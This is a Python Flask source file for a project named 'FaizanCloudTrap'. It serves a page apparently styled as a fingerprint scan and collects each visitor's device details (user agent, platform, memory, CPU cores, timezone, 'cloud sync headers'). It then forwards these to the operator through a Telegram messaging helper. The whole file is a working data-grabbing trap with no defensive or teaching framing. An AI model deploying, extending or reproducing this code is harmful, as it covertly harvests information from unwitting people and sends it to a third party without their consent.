# 📁 FaizanCloudTrap/app.py
from flask import Flask, request, render_template
from telegram_handler import send_telegram_message
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('scan_fingerprint.html')

@app.route('/fingerprint', methods=["POST"])
def collect_fingerprint():
    data = request.get_json()
    message = f"\n👤 Device Info Collected:\n"
    message += f"📱 User-Agent: {data.get('user_agent')}\n"
    message += f"🌐 Platform: {data.get('platform')}\n"
    message += f"💽 Device Memory: {data.get('device_memory')} GB\n"
    message += f"🧠 Cores: {data.get('hardware_concurrency')}\n"
    message += f"🕒 Timezone: {data.get('timezone')}\n"
    message += f"📂 Cloud Sync Headers: {data.get('cloud_headers')}\n"
    message += f"🕰️ Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    send_telegram_message(message)
    return {"status": "sent"}

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
